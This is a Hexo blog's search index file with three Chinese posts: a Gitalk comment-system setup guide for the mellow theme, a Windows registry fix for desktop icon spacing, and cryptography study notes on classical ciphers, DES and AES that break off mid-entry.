<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Gitalk配置教程，基于mellow主题</title>
      <link href="/2020/01/16/Gitalk%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2020/01/16/Gitalk%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Gitment已经不能正常使用了且主题作者已经人间蒸发，于是自己动手，配置gitalk评论系统。</p></blockquote><a id="more"></a><h1 id="文件修改"><a href="#文件修改" class="headerlink" title="文件修改"></a>文件修改</h1><h2 id="新增gitalk-ejs文件"><a href="#新增gitalk-ejs文件" class="headerlink" title="新增gitalk.ejs文件"></a>新增gitalk.ejs文件</h2><p>在<code>mellow\layout\_partial\_plugins</code>目录下新增<code>gitalk.ejs</code>文件，配置如下：<br><figure class="highlight html"><figcaption><span>gitalk.ejs配置</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://unpkg.com/gitalk/dist/gitalk.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/gitalk/dist/gitalk.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"gitalk-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      var gitalk = new Gitalk(&#123;</span></span><br><span class="line"><span class="xml">        clientID: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.ClientID</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        clientSecret: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.ClientSecret</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        repo: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.repo</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        owner: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.owner</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        admin: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.adminUser</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        id: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.ID</span> %&gt;</span>,</span></span><br><span class="line"><span class="xml">        labels: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.labels</span> %&gt;</span>'.split(',').filter(l =&gt; l),</span></span><br><span class="line"><span class="xml">        perPage: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.perPage</span> %&gt;</span>,</span></span><br><span class="line"><span class="xml">        pagerDirection: '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.pagerDirection</span> %&gt;</span>',</span></span><br><span class="line"><span class="xml">        createIssueManually: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.createIssueManually</span> %&gt;</span>,</span></span><br><span class="line"><span class="xml">        distractionFreeMode: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.distractionFreeMode</span> %&gt;</span></span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">      gitalk.render('gitalk-container')</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="修改comment-ejs文件"><a href="#修改comment-ejs文件" class="headerlink" title="修改comment.ejs文件"></a>修改comment.ejs文件</h2><p>文件路径：<code>mellow\layout\_partial\post\comment.ejs</code>，这里直接替换<code>gitment</code>为<code>gitalk</code>即可(反正Gitment也不要了)<br><figure class="highlight js"><figcaption><span>comment.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span> (theme.valine.enable) &#123; %&gt;</span><br><span class="line">    &lt;%- partial(<span class="string">'../_plugins/valine'</span>) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="keyword">if</span> (!theme.valine.enable &amp;&amp; theme.gitalk.enable) &#123; %&gt;</span><br><span class="line">    &lt;div id=<span class="string">"gitalk-container"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;%- partial(<span class="string">'../_plugins/gitalk'</span>) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p><h1 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h1><p>修改主题下的<code>_config.yml</code>配置文件，新增gitalk配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># gitalk评论系统</span><br><span class="line">gitalk:</span><br><span class="line">  enable: true</span><br><span class="line">  ClientID: xxxxx #Client ID</span><br><span class="line">  ClientSecret: xxxxxxxxxx </span><br><span class="line">  repo: blog #你要存放的项目名，</span><br><span class="line">  owner: YuanLiChenAi #这个项目名的拥有者（GitHub账号或组织）</span><br><span class="line">  adminUser: [&apos;YuanLiChenAi&apos;] #管理员用户</span><br><span class="line">  ID: location.pathname #页面ID，即文章的url，作为唯一性标识。因github限制labels长度为50个字符，故不建议设置中文路径。</span><br><span class="line">  labels: [&apos;Gitalk&apos;] #GitHub issues的标签</span><br><span class="line">  perPage: 15 #每页多少个评论</span><br><span class="line">  pagerDirection: last #排序方式是从旧到新（first），还是从新到旧（last）</span><br><span class="line">  createIssueManually: true #是否自动创建isssue，自动创建需要当前登录的用户为adminuser</span><br><span class="line">  distractionFreeMode: false #是否启用快捷键(cmd|ctrl + enter) 提交评论</span><br></pre></td></tr></table></figure></p><h1 id="移花接木"><a href="#移花接木" class="headerlink" title="移花接木"></a>移花接木</h1><p>因为之前是使用的是Gitment评论系统，这就意味着只要更改issues标签，就能将已有的评论转接到Gitalk上。<br>注意需要先取消之前的issues的labels标签<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Gitalk/2020-01-16-21-50-19.png" alt="修改issues" title="" class="">                <p>修改issues</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Gitalk/2020-01-16-21-51-01.png" alt="取消勾选gitment并选择gitalk" title="" class="">                <p>取消勾选gitment并选择gitalk</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Gitalk/2020-01-16-21-55-31.png" alt="效果" title="" class="">                <p>效果</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Gitalk/2020-01-16-21-56-02.png" alt="批量更改" title="" class="">                <p>批量更改</p>            </figure></p><h1 id="解决GitHub中的Issues-labels限制的50个字符长度问题"><a href="#解决GitHub中的Issues-labels限制的50个字符长度问题" class="headerlink" title="解决GitHub中的Issues labels限制的50个字符长度问题"></a>解决GitHub中的Issues labels限制的50个字符长度问题</h1><p>前面提到中文路径的页面ID会在issues中将中文转换成url编码，那么长度就会超过50个字符</p><h2 id="将中文ID转换成MD5值"><a href="#将中文ID转换成MD5值" class="headerlink" title="将中文ID转换成MD5值"></a>将中文ID转换成MD5值</h2><h3 id="修改gitalk-ejs"><a href="#修改gitalk-ejs" class="headerlink" title="修改gitalk.ejs"></a>修改gitalk.ejs</h3><p>在<code>gitalk.ejs</code>中添加对<code>md5.js</code>的引用：<br><figure class="highlight html"><figcaption><span>gitalk.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="修改页面ID"><a href="#修改页面ID" class="headerlink" title="修改页面ID"></a>修改页面ID</h3><p>修改<code>comment.ejs</code>文件中的页面ID<br><figure class="highlight js"><figcaption><span>comment.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id: md5(<span class="xml"><span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.gitalk.ID</span> %&gt;</span>),</span></span><br></pre></td></tr></table></figure></p><blockquote><p>参考<br><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程-可能是目前最详细的教程</a><br><a href="https://www.itfanr.cc/2019/04/30/hexo-add-gitalk-comment/" target="_blank" rel="noopener">Hexo博客添加Gitalk评论系统</a><br><a href="https://github.com/gitalk/gitalk/wiki/%E5%9C%A8hexo%E4%B8%AD%E4%BD%BF%E7%94%A8gitalk" target="_blank" rel="noopener">在hexo中使用gitalk</a></p></blockquote><p><br><br><br></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Windows桌面图标样式修改</title>
      <link href="/2019/08/28/Windows%E6%A1%8C%E9%9D%A2%E5%9B%BE%E6%A0%87%E6%A0%B7%E5%BC%8F%E4%BF%AE%E6%94%B9/"/>
      <url>/2019/08/28/Windows%E6%A1%8C%E9%9D%A2%E5%9B%BE%E6%A0%87%E6%A0%B7%E5%BC%8F%E4%BF%AE%E6%94%B9/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>更新了windows 1903后，发现桌面图标变得异常</p></blockquote><a id="more"></a><p>情况类似下图，图标之间间隙特别大<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/DesktopIcon/2019-08-29-21-38-48.png" alt="" title="" class="">                <p></p>            </figure><br>检查注册表发现系统更新之后桌面图标样式参数变化，IconSpacing(图标间距)和IconVerticalSpacing(图标垂直间距)参数变太大了，修改为正常值后就恢复正常了。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/DesktopIcon/2019-08-29-22-12-01.png" alt="" title="" class="">                <p></p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 路劲</span><br><span class="line">计算机\HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics</span><br><span class="line"></span><br><span class="line"># 参数</span><br><span class="line">BorderWidth 边框宽度</span><br><span class="line">CaptionHeight 标题栏高度</span><br><span class="line">CaptionWidth 标题栏宽度</span><br><span class="line">IconSpacing 图标间距</span><br><span class="line">IconTitleWrap 图标标题是否自动换行，1即是</span><br><span class="line">IconVerticalSpacing 图标垂直间距</span><br><span class="line">MenuHeight 菜单高度</span><br><span class="line">MenuWidth 菜单宽度</span><br><span class="line">MinAnimate 最小动画，1即是</span><br><span class="line">PaddedBorderWidth 填充边框宽度</span><br><span class="line">ScrollHeight 滚动高度</span><br><span class="line">ScrollWidth 滚动宽度</span><br><span class="line">Shell Icon Size 改变图标大小</span><br><span class="line">SmCaptionHeight 调色板标题高度</span><br><span class="line">SmCaptionWidth 调色板标题宽度</span><br></pre></td></tr></table></figure><blockquote><p>参数单位为像素，设置后注销或重启后生效</p></blockquote><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> System </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 桌面图标 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>密码学基础与应用</title>
      <link href="/2019/05/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
      <url>/2019/05/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>梳理下最近学的密码学基础知识</p></blockquote><a id="more"></a><h1 id="密码学概论"><a href="#密码学概论" class="headerlink" title="密码学概论"></a>密码学概论</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>密码学是一门古老的学科，研究密码学编制的科学称为<strong>密码编制学</strong>(Cryptography),研究破译密码学的科学称为<strong>密码分析学</strong>(Cryptoanalysis),密码编制学和密码分析学共同组成<strong>密码学</strong>。</li><li>密码学的三个安全目标<ul><li>保密性      </li><li>完整性</li><li>可用性</li></ul></li></ul><blockquote><ul><li>保密性是确保信息仅被合法用户访问，而不被泄露给非授权用户、实体或过程，或供其利用的特性。</li><li>完整性是指所有资源只能由授权方或以授权的方式进行修改，即信息未经授权不能进行改变的特性。</li><li>可用性是指所有资源在适当的时候可以由授权方访问，即信息可被授权实体访问并按需求使用的特性。</li></ul></blockquote><h2 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h2><ul><li>明文空间M</li><li>密文空间C</li><li>密钥空间K</li><li>加密算法E</li><li>解密算法D</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-11-11-03-49.png" alt="密码体制" title="" class="">                <p>密码体制</p>            </figure><p><br></p><h2 id="密码分析学"><a href="#密码分析学" class="headerlink" title="密码分析学"></a>密码分析学</h2><p><strong>攻击方法</strong></p><ul><li>穷举法</li><li>数学分析攻击</li><li>基于物理的攻击</li></ul><p><strong>可利用的数学资源</strong></p><ul><li>仅知密文攻击(最不利的情况)</li><li>已知明文攻击(某些明文-密文对)</li><li>选择明文攻击(计算机系统和数据库系统特别容易受到这种攻击)</li><li>选择密文攻击(主要用于攻击公开密钥密码体制，特别是攻击其数字签名)</li></ul><p><br></p><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><ul><li>置换密码<br>将明文中的字母重新排列，字母本身不变，但其位置改变了，这样编成的密码称为<strong>置换密码</strong>。</li><li>代替密码<br>用密文字母表中的字母或字母组来代替明文字母或字母组，各字母或字母组的相对位置不变，但其本身改变了，这样编成的密码称为<strong>代替密码</strong>。<ol><li>加法密码：凯撒密码(Caesar)，右移3位<br><img src="https://bp.yuanlichenai.cn/Crypto/2019-05-11-11-23-35.png" alt="加法密码"></li><li>乘法密码<br><img src="https://bp.yuanlichenai.cn/Crypto/2019-05-11-11-24-00.png" alt="乘法密码"></li><li>仿射密码：乘法密码与加法密码相结合<br><img src="https://bp.yuanlichenai.cn/Crypto/2019-05-11-11-28-05.png" alt=""><br>简单代替密码<br>多表代替密码：维吉尼亚密码(Vigenre)，密行、明列。</li><li>代数密码<br>相同为0，不同为1<br><img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-09-40-56.png" alt="代数密码"></li></ol></li></ul><h2 id="古典密码破解方法"><a href="#古典密码破解方法" class="headerlink" title="古典密码破解方法"></a>古典密码破解方法</h2><p><strong>穷举分析</strong></p><ul><li>加法密码：对k的可能取值逐一穷举</li><li>乘法密码：密钥k要满足(n,k)=1</li><li>放射密码：密钥k有$26*12-1=311$种</li></ul><p><strong>统计分析</strong></p><ul><li>统计密文的各种统计特性</li><li>分析双字母、三字母密文组，以区分元音和辅音字母</li><li>最后分析字母较多的密文</li></ul><p><br><br><br></p><h1 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li>设M为明文，分组密码将M划分为一系列的明文块M<sub>i</sub>,通常每块包含若干个位或字符，并且对每一块M<sub>i</sub>都用同一个密文K<sub>e</sub>进行加密。常用于商用领域。<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-10-06-02.png" alt="分组密码" title="" class="">                <p>分组密码</p>            </figure></li></ul><h2 id="分组密码算法结构"><a href="#分组密码算法结构" class="headerlink" title="分组密码算法结构"></a>分组密码算法结构</h2><h3 id="Feistel结构"><a href="#Feistel结构" class="headerlink" title="Feistel结构"></a>Feistel结构</h3><ul><li>Feistel结构把任何函数(一般称为f函数，又称轮函数)转化为一个置换<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/Feistel.png" alt="Feistel结构" title="" class="">                <p>Feistel结构</p>            </figure></li></ul><h3 id="SP结构"><a href="#SP结构" class="headerlink" title="SP结构"></a>SP结构</h3><ul><li>SP结构是Feistel结构的一种推广，其结构清晰<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-10-35-09.png" alt="SP结构" title="" class="">                <p>SP结构</p>            </figure><blockquote><p>替换S：混淆的作用，即密文和密钥尽可能的复杂<br>线性变换P：扩散的作用，即明文当中的每一位能够影响密文当中的每一位。</p></blockquote></li></ul><p><br><br><br></p><h2 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h2><p><strong>DES算法流程</strong></p><ul><li>初始置换IP</li><li>生成16个48位的子密钥</li><li>16轮Feistel结构迭代<ul><li>扩展置换E</li><li>S盒代换</li><li>置换P</li></ul></li><li>逆初始置换IP<sup>-1</sup></li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-10-41-40.png" alt="DES算法" title="" class="">                <p>DES算法</p>            </figure><h3 id="初始置换IP"><a href="#初始置换IP" class="headerlink" title="初始置换IP"></a>初始置换IP</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-11-17.png" alt="初始置换IP" title="" class="">                <p>初始置换IP</p>            </figure><h3 id="生成16个48位的子密钥"><a href="#生成16个48位的子密钥" class="headerlink" title="生成16个48位的子密钥"></a>生成16个48位的子密钥</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-16-11.png" alt="生成16个48位的子密钥" title="" class="">                <p>生成16个48位的子密钥</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-24-44.png" alt="置换选择1" title="" class="">                <p>置换选择1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-49-03.png" alt="循环左移" title="" class="">                <p>循环左移</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-51-43.png" alt="置换选择2" title="" class="">                <p>置换选择2</p>            </figure><p><br></p><h3 id="16轮Feistel结构迭代"><a href="#16轮Feistel结构迭代" class="headerlink" title="16轮Feistel结构迭代"></a>16轮Feistel结构迭代</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-11-58-51.png" alt="16轮Feistel结构迭代" title="" class="">                <p>16轮Feistel结构迭代</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-14-12-16.png" alt="扩展置换E" title="" class="">                <p>扩展置换E</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-14-18-18.png" alt="S盒代换" title="" class="">                <p>S盒代换</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-14-21-27.png" alt="置换P" title="" class="">                <p>置换P</p>            </figure><p><br></p><h3 id="逆初始置换IP-1"><a href="#逆初始置换IP-1" class="headerlink" title="逆初始置换IP-1"></a>逆初始置换IP<sup>-1</sup></h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-14-29-25.png" alt="逆初始置换IP<sup>-1</sup>" title="" class="">                <p>逆初始置换IP<sup>-1</sup></p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-14-48-49.png" alt="IP<sup>-1</sup>" title="" class="">                <p>IP<sup>-1</sup></p>            </figure><p><br></p><h3 id="DES算法的安全性"><a href="#DES算法的安全性" class="headerlink" title="DES算法的安全性"></a>DES算法的安全性</h3><ul><li>密钥较短<br>面对计算能力高速发展的形势，DES采用56位密钥，密钥量仅为2<sup>56</sup>，约为10<sup>17</sup></li><li>存在弱密钥<ul><li>弱密钥K<br>K<sub>1</sub>=K<sub>2</sub>=……K<sub>16</sub>,弱密钥不受任何循环移位影响。<br>全为0或全为1，被分割的两部分分别为全0或全1，共<strong>4</strong>种弱密钥。</li><li>半弱密钥K<br>有些种子密钥只能生成两个不同的子密钥，这样的种子密钥称为半弱密钥。DES至少存在<strong>12</strong>个半弱密钥，半弱密钥将导致把明文加密成相同的密文。</li></ul></li></ul><h3 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h3><p><strong>优点</strong></p><ul><li>密钥长度为168位，能够抵挡有效攻击(第一次和第三次加密都是同一个密钥则为112位)</li><li>相当安全，而且经过实践检验</li><li>加密算法与DES相同，现有的DES软硬件产品都能方便实现3DES</li></ul><p><strong>缺点</strong></p><ul><li>用软件实现该算法的速度比较慢</li></ul><h3 id="考试知识点"><a href="#考试知识点" class="headerlink" title="考试知识点"></a>考试知识点</h3><p>在DES算法中</p><ul><li>密钥的长度(有效)是56位</li><li>加密分组的长度是64位</li><li>子密钥的长度是48位</li><li>函数F输入时32位</li></ul><p><br><br><br></p><h2 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h2><ul><li>一个初始轮密钥加</li><li>Nr-1圈的标准轮函数</li><li>最后一圈的非标准轮函数</li><li><p>最后一轮不进行列混淆变换</p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-15-29-15.png" alt="AES算法" title="" class="">                <p>AES算法</p>            </figure></li><li><p>RIJNDAEL算法<br>数据块长度和密钥长度都可变的分组加密算法，其数据块长度和密钥长度都可独立地选定为大于等于128位、且小于等于256位的32位的任意倍数。</p></li><li>AES(先进加密标准)算法<br>数据块长度为128位，密钥的长度可分别选择为128位、192位或256位。</li></ul><blockquote><p><strong>状态</strong>：在RIJNDAEL算法中，加解密要经过多次数据变换操作，每一次变换操作产生一个中间结果，称这个中间结果叫做<strong>状态</strong>。状态表示为<strong>二维字节数组</strong>(每个元素为一个字节)，它有<strong>四行</strong>，<strong>Nb列</strong>，Nb列等于数据块长度除以32。</p></blockquote><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-16-11-56.png" alt="数据块长度为128位的状态" title="" class="">                <p>数据块长度为128位的状态</p>            </figure><blockquote><p>密钥也可以表示为<strong>二维字节数组</strong>(每个元素为一个字节)，它有四行，Nk列，Nk列等于密钥块长度除以32。</p></blockquote><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-16-13-54.png" alt="密钥长度为128位的密钥二维字节数组" title="" class="">                <p>密钥长度为128位的密钥二维字节数组</p>            </figure><blockquote><p>迭代圈数Nr由Nb和Nk共同决定。</p></blockquote><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-16-33-03.png" alt="算法迭代圈数Nr" title="" class="">                <p>算法迭代圈数Nr</p>            </figure><h3 id="初始轮密钥加"><a href="#初始轮密钥加" class="headerlink" title="初始轮密钥加"></a>初始轮密钥加</h3><ul><li>将明文矩阵与子密钥矩阵的对应字节进行<strong>逐比特异或</strong>。<br>$AddRoundKey(a_0,k_0)=a_0 \bigoplus k_0$</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-16-43-38.png" alt="逐比特异或" title="" class="">                <p>逐比特异或</p>            </figure><p><br><br><br></p><h3 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h3><ul><li>采用替换/置换网络(SP)结构，组成：<ul><li>非线性层：S盒变换ByteSub，<strong>混淆作用</strong>。</li><li>线性混合层：行位移变换ShiftRow和列混合变换MixColumn，<strong>扩散作用</strong>。</li><li>密钥加层：圈密钥加变换AddRoundkey组成，最后一圈的轮函数<strong>没有</strong>列混合变换。</li></ul></li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-09-16-49-55.png" alt="轮函数" title="" class="">                <p>轮函数</p>            </figure><p><br></p><h4 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h4><p><strong>字节代换：S盒变换ByteSub</strong></p><ul><li>一个关于字节的非线性变换，可以使用<strong>S盒查表</strong>得出输出。</li><li>AES定义了一个S盒，由16*16个字节组成的方形表，包含了8位值所能表示的256种可能的变换。</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-10-16-13.png" alt="字节代换" title="" class="">                <p>字节代换</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-10-40-53.png" alt="AES加密算法 S盒表(十六进制)" title="" class="">                <p>AES加密算法 S盒表(十六进制)</p>            </figure><ul><li>高位为行，低位为列。即51对应5行1列的D1</li></ul><blockquote><p>AES算法与DES算法的S盒比较：</p><ul><li>AES，由16个S盒组成，运算是可逆的；输入输出位数相同。</li><li>DES，由8个S盒组成，运算不可逆，每个S盒输入是6bit,输出是4bit。</li></ul></blockquote><h4 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h4><p><strong>行移位：ShiftRow</strong></p><ul><li>将状态矩阵的每行进行循环左移</li><li>第0行不移；第i行左移i个字节(i=1,2,3)</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-11-05-20.png" alt="行移位1" title="" class="">                <p>行移位1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-11-07-53.png" alt="行移位2" title="" class="">                <p>行移位2</p>            </figure><h4 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h4><p><strong>列混合：MixColumn</strong></p><ul><li>列混合变换将<strong>State乘以一个固定的矩阵A</strong>，对State逐列进行变换，每一列中的每个字节将变换成一个新值，直到4列均变换完毕。</li><li>相乘后得到的乘积矩阵，其中每个元素均是一行和一列中所对元素的乘积之和。</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-11-09-43.png" alt="列混合" title="" class="">                <p>列混合</p>            </figure><blockquote><p>将固定矩阵中的第一行和State的第一列的每个字节分别相乘，再进行异或运算得到第一行第一列的值，即：<br>$(02*D1) \bigoplus (03*93) \bigoplus (01*CA) \bigoplus (01*40)=9D$<br>第二行第一列则通过固定矩阵中的第二行和State的第一列进行计算，即：<br>$(01*D1) \bigoplus (02*93) \bigoplus (03*CA) \bigoplus (01*40)=E9$<br>以此类推…</p></blockquote><h4 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h4><p><strong>轮密钥加：AddRoundkey(State,RoundKey)</strong></p><ul><li>将状态矩阵与子密钥矩阵的对应字节进行<strong>逐比特异或</strong>：<br>$AddRoundKey(a_{ij},k_{ij})=a_{ij} \bigoplus k_{ij}$</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-11-31-48.png" alt="轮密钥加" title="" class="">                <p>轮密钥加</p>            </figure><blockquote><p><strong>轮函数：</strong>第一轮结束后，回到轮函数迭代10轮(主要针对数据块长度和密钥长度为128位)，最后一轮不需要进行列混合变换，结束迭代后输出密文。 </p></blockquote><h3 id="解密算法"><a href="#解密算法" class="headerlink" 